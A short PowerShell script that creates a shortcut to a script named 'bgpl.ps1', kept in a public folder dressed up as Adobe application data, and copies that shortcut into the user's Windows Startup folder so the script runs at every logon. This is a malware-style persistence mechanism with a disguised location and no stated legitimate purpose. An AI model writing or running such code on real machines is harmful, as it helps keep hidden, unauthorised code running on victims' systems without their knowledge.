function set-shortcut {

param ( [string]$SourceLnk, [string]$DestinationPath )

    $WshShell = New-Object -comObject WScript.Shell

    $Shortcut = $WshShell.CreateShortcut($SourceLnk)

    $Shortcut.TargetPath = $DestinationPath

    $Shortcut.Save()

    }
set-shortcut "C:\Users\Public\Documents\Adobe\Common\BTX\bgpl.ps1.lnk" "C:\Users\Public\Documents\Adobe\Common\BTX\bgpl.ps1"
cd "~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
Copy-Item -Path C:\Users\Public\Documents\Adobe\Common\BTX\bgpl.ps1.lnk -Destination bgpl.ps1.lnk
cd C:/Users/Public/Documents/Adobe/Common/BTX